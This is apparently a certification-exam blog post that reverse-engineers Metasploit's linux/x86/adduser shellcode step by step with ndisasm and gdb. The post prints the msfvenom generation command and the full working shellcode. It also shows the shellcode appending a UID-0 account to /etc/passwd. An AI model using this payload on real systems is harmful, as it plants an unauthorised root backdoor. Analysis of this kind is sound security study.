---
layout: post
title: SLAE 5.2 - Metasploit Payload Analysis adduser
date:   2019-03-02
categories: [SLAE, Assembly]
---

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

The fifth question for the SLAE exam is to analyze 3 metasploit payloads, this is part 2 of 3 for this question.  The requirements are:
* Select a linux/x86 payload from msfpayload
* Use gdb/ndisasm/libemu to dissect the functionality of the shellcode
* Present the analysis

The 2nd metasploit payload we will analyze will be linux/x86/adduser.

Time to set up the payload options and output the shellcode with msfvenom.
```c
msfvenom -p linux/x86/adduser PASS=SLAE USER=SLAE SHELL=/bin/sh -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 91 bytes
Final size of c file: 409 bytes
unsigned char buf[] = 
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x22\x00\x00\x00\x53\x4c"
"\x41\x45\x3a\x41\x7a\x72\x63\x6e\x7a\x50\x59\x6c\x66\x72\x32"
"\x45\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73"
"\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd"
"\x80";
```
Time to make sure it works.  Place shellcode in the c wrapper, compile with proper flags, then run this with elevated permissions.  Since we are editing /etc/passwd, this will need to be run with sudo OR change permissions to your /etc/passwd file then revert after testing.  Steps for the c wrapper and compiler flags can be found in my first two SLAE posts - Shell Bind TCP and Shell Reverse TCP.
```
sudo ./shellcode2
[sudo] password for pwoer: 
Shellcode Length:  40
```
Successfully ran without any errors.. Let's take a look at the bottom of the /etc/passwd file now.
```
cat /etc/passwd
pwoer:x:1000:1000:gg,,,:/home/pwoer:/bin/bash
SLAE:AzrcnzPYlfr2E:0:0::/:/bin/sh
```
It works! Time to walk through the shellcode..

Instead of gdb for analysis this time, we will be using ndisasm.  Let's run ndisasm with our shellcode as the input to see what happens.
```
echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x22\x00\x00\x00\x53\x4c\x41\x45\x3a\x41\x7a\x72\x63\x6e\x7a\x50\x59\x6c\x66\x72\x32\x45\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
00000025  93                xchg eax,ebx
00000026  E822000000        call dword 0x4d
0000002B  53                push ebx
0000002C  4C                dec esp
0000002D  41                inc ecx
0000002E  45                inc ebp
0000002F  3A417A            cmp al,[ecx+0x7a]
00000032  7263              jc 0x97
00000034  6E                outsb
00000035  7A50              jpe 0x87
00000037  59                pop ecx
00000038  6C                insb
00000039  667232            o16 jc 0x6e
0000003C  45                inc ebp
0000003D  3A30              cmp dh,[eax]
0000003F  3A30              cmp dh,[eax]
00000041  3A3A              cmp bh,[edx]
00000043  2F                das
00000044  3A2F              cmp ch,[edi]
00000046  62696E            bound ebp,[ecx+0x6e]
00000049  2F                das
0000004A  7368              jnc 0xb4
0000004C  0A598B            or bl,[ecx-0x75]
0000004F  51                push ecx
00000050  FC                cld
00000051  6A04              push byte +0x4
00000053  58                pop eax
00000054  CD80              int 0x80
00000056  6A01              push byte +0x1
00000058  58                pop eax
00000059  CD80              int 0x80
```
As you can see, it takes the shellcode and converts it in to readable assembly.  The 2nd column is actually our opcodes!

We can see multiple int 0x80's at:

  00000007
  
  00000023
  
  00000054
  
  00000059

These will be our focus points for the analysis so we can figure out which syscalls are happening throughout the shellcode.
```
00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
```
We zero out both ECX and EBX.

Then EAX is set to 0x46
```shell
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 70
#define __NR_setreuid 70
```
So our syscall here is setreuid with args - 0 and 0
> int setreuid(uid_t ruid, uid_t euid);

> setreuid(0, 0);

What this call does is sets our process to run as both real and effective id - 0 (root).

Our next syscall block is:
```nasm
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
```
We see EAX being set to 0x5.  Let's check which syscall that is..
```shell
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 5
#define __NR_open 5
```
Open is defined as:
```c
int open(const char *pathname, int flags);
```
The next instructions:
```nasm
xor,ecx ecx
push ecx
push dword 0x64777373
push dword 0x61702f2f
push dword 0x6374652f
mov ebx, esp
```
This is pushing a string to the stack and terminating it with a null byte (ECX).  The stack pointer address is then moved into EBX, which will be the first parameter of open -- the pathname.  So we should expect a filename when we change the hex values to ascii.  
```
>>> binascii.unhexlify('6374652f')
'cte/'
>>> binascii.unhexlify('61702f2f')
'ap//'
>>> binascii.unhexlify('64777373')
'dwss'
```
With Little Endian, this translates to-- '/etc//passwd'.  So, as expected, we are going to be opening /etc/passwd in order to add a user.  The double '/' in the middle is a way to make the string fit into the dword size so there aren't any compilcations with pushing the strings to the stack.  The trick uses the idea that the file path can have as many '/' in a row and it will still read the path as if it only has 1 slash in it. For example, /etc//////passwd, or /////etc/passwd both will be read as '/etc/passwd'.
```nasm
inc ecx
mov ch,0x4
int 0x80
```
ECX will hold the flag value for how we want to open the file.  1 means O_WRONLY. Next, 0x4 is moved into ch. ch is the upper 2 bytes of CX. Meaning CX is now 0x0401.  The flag constants are defined with octal values.  0x400 is octal 02000 which is defined as O_APPEND.

The next instruction is the interrupt that calls open('/etc//passwd', O_WRONLY|O_APPEND);
```nasm
00000025  93                xchg eax,ebx
00000026  E822000000        call dword 0x4d
... (skipping to call location)
0000004C  0A598B            or bl,[ecx-0x75]
0000004F  51                push ecx
00000050  FC                cld
```
The xchg instruction moves our return value from open to the EBX register -- our file descriptor.

It seems our instructions at the called location are off by a bit.  Let's open up gdb to see if we can get the proper instructions so we are walking through the right steps.. Let's disassemble the shellcode portion so we can find the proper address..
```nasm
gdb-peda$ disas
Dump of assembler code for function code:
=> 0x0804a040 <+0>:	xor    ecx,ecx
   0x0804a042 <+2>:	mov    ebx,ecx
   0x0804a044 <+4>:	push   0x46
   0x0804a046 <+6>:	pop    eax
   0x0804a047 <+7>:	int    0x80
   0x0804a049 <+9>:	push   0x5
   0x0804a04b <+11>:	pop    eax
   0x0804a04c <+12>:	xor    ecx,ecx
   0x0804a04e <+14>:	push   ecx
   0x0804a04f <+15>:	push   0x64777373
   0x0804a054 <+20>:	push   0x61702f2f
   0x0804a059 <+25>:	push   0x6374652f
   0x0804a05e <+30>:	mov    ebx,esp
   0x0804a060 <+32>:	inc    ecx
   0x0804a061 <+33>:	mov    ch,0x4
   0x0804a063 <+35>:	int    0x80
   0x0804a065 <+37>:	xchg   ebx,eax
   0x0804a066 <+38>:	call   0x804a08d <code+77>
   0x0804a06b <+43>:	push   ebx
   0x0804a06c <+44>:	dec    esp
   0x0804a06d <+45>:	inc    ecx
   0x0804a06e <+46>:	inc    ebp
   0x0804a06f <+47>:	cmp    al,BYTE PTR [ecx+0x7a]
   0x0804a072 <+50>:	jb     0x804a0d7
   0x0804a074 <+52>:	outs   dx,BYTE PTR ds:[esi]
   0x0804a075 <+53>:	jp     0x804a0c7
   0x0804a077 <+55>:	pop    ecx
   0x0804a078 <+56>:	ins    BYTE PTR es:[edi],dx
   0x0804a079 <+57>:	data16 jb 0x804a0ae
   0x0804a07c <+60>:	inc    ebp
   0x0804a07d <+61>:	cmp    dh,BYTE PTR [eax]
   0x0804a07f <+63>:	cmp    dh,BYTE PTR [eax]
   0x0804a081 <+65>:	cmp    bh,BYTE PTR [edx]
   0x0804a083 <+67>:	das    
   0x0804a084 <+68>:	cmp    ch,BYTE PTR [edi]
   0x0804a086 <+70>:	bound  ebp,QWORD PTR [ecx+0x6e]
   0x0804a089 <+73>:	das    
   0x0804a08a <+74>:	jae    0x804a0f4
   0x0804a08c <+76>:	or     bl,BYTE PTR [ecx-0x75]
   0x0804a08f <+79>:	push   ecx
   0x0804a090 <+80>:	cld    
   0x0804a091 <+81>:	push   0x4
   0x0804a093 <+83>:	pop    eax
   0x0804a094 <+84>:	int    0x80
   0x0804a096 <+86>:	push   0x1
   0x0804a098 <+88>:	pop    eax
   0x0804a099 <+89>:	int    0x80
   0x0804a09b <+91>:	add    BYTE PTR [eax],al
End of assembler dump.
gdb-peda$ 
```
Our call is "call 0x804a08d" at address 0x0804a066.  Looking at the called address, we see the same issue where the instruction addresses dont seem to fit into what we are expecting.  We can view instructions for the specific address that is being called with the x/i command.  Let's just grab a random number of instructions and see if it catches back up with the proper instructions.
```nasm
gdb-peda$ x/6i 0x804a08d
   0x804a08d <code+77>:	pop    ecx
   0x804a08e <code+78>:	mov    edx,DWORD PTR [ecx-0x4]
   0x804a091 <code+81>:	push   0x4
   0x804a093 <code+83>:	pop    eax
   0x804a094 <code+84>:	int    0x80
   0x804a096 <code+86>:	push   0x1
gdb-peda$
```
As expected, the push 0x4 is where we are lined back up.. The next instructions are:
```nasm
  pop ecx
  mov edx, DWORD PTR [ecx-0x4]
```
We are seeing the call-pop technique here used to push an address on the stack that most likely contains an important value to the shellcode.  Let's take a look at what that value is.. We are planning to write to a file so I am assuming it will be the string for our /etc//passwd file we opened.
```
gdb-peda$ x/s 0x804a06b
0x804a06b <code+43>:	"SLAE:AzrcnzPYlfr2E:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀"
```
There we have it, the entry we will be appending to /etc/passwd.  So, now we know that we have our file descriptor from the open saved in EBX, and the string we are appending saved in ECX.

The next instruction is very clever.  Looking at our opcodes for the call instruction, we have E822000000 which translates to:
```
ndisasm> E822000000
E822000000               call dword 0x27
```
Since our string is what we are jumping over, the length of our string is stored as the "22" part of the opcode.  The string is 34 characters in length (including the \n) which translates to 22 hex.  Our next instruction is "mov edx, DWORD PTR \[ecx-0x4\]".  Which points us right at the length of the string we just jumped over!

Finishing up the syscall, EAX is set to 4 which is write:
```c
ssize_t write(int fd, const void *buf, size_t count); 
```
Our interrupt is called so our two syscalls equate to:
```c
fd = open('/etc//passwd', O_WRONLY|O_APPEND);
buf = "SLAE:AzrcnzPYlfr2E:0:0::/:/bin/sh\n";
write(fd, buf, 34);
```
The final instructions are straight forward.
```nasm
00000056  6A01              push byte +0x1
00000058  58                pop eax
00000059  CD80              int 0x80
```
EAX = 1 which means exit and then the interrupt is called to finish our analysis!
